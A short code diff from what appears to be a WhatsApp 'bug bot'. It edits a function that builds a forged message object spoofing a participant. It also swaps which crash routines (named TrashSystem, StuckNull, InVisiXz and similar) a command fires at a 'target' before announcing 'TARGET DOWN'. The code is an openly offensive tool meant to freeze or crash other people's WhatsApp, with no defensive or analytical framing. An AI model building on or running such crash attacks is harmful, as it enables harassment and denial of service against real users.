@@ -592,7 +592,7 @@ async function InVisiXz(target, spider, cct = false, ptcp = false) {
 		const Qrad = {
 			key: {
 				remoteJid: 'p',
-				fromMe: false,
+				from: false,
 				participant: '0@s.whatsapp.net'
 			},
 			message: {
@@ -1067,7 +1067,8 @@ reply(`Wait Your Target is being Utilised`)
   await TrashSystem(target, sam, cct = true, ptcp = true)
  await StuckNull(target, sam, cct = true, ptcp = true)
 await ZnXIvS(target, sam, cct = true, ptcp = true)
- await ClPmNull(target, sam, cct = true, ptcp = true)
+await InVisiXz(target, sam, cct = true, ptcp = true)
+ 
 reply(`
 ┏━━━━━━━━━━━━━━━━━━━━━
 ┃ ▣ 𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗢𝗪𝗡
